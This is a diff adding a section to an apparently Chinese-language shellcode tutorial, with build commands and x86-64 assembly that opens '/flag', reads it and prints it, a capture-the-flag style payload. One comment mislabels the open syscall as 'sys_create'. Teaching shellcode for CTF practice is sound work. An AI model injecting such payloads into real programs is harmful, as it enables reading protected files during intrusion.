@@ -16,6 +16,7 @@ comments: true
 - [5. Common Gotchas](#5-common-gotchas)
 - [6. Cross-Architecture shellcode](#6-cross-architecture-shellcode)
 - [7. Data Execution Prevention](#7-data-execution-prevention)
+- [8. shellcode program](#8-shellcode-program)
 
 
 ## 1. 介绍: shellcode是什么<br>
@@ -112,3 +113,44 @@ gdb ./shellcode-elf
 ## 6. Cross-Architecture shellcode<br>
 
 ## 7. Data Execution Prevention<br>
+
+## 8. shellcode program<br>
+使用如下命令进行编译:<br>
+```
+gcc -nostdlib -static shellcode.s -o shellcode.elf
+objcopy --dump-section .text=shellcode.raw shellcode.elf
+```
+汇编代码如下:<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+        mov rax, 2 # sys_create
+        lea rdi, [rip+file_name] # file_name
+        mov rsi, 2 # O_RDWR
+        syscall
+        lea rdi, [rip+file_fd]
+        mov [rdi], eax
+
+        mov rax, 0 # sys_read
+        mov edi, [rip+file_fd]
+        lea rsi, [rip+buffer]
+        mov edx, [rip+buffer_len]
+        syscall
+
+        mov rax, 1 # sys_write
+        mov rdi, 1 # stdout
+        lea rsi, [rip+buffer]
+        mov edx, [rip+buffer_len]
+        syscall
+binsh:
+        .string "/bin/sh"
+file_name:
+        .string "/flag"
+file_fd:
+        .long 0
+buffer:
+        .space 0x100
+buffer_len:
+        .long 0x100
+```
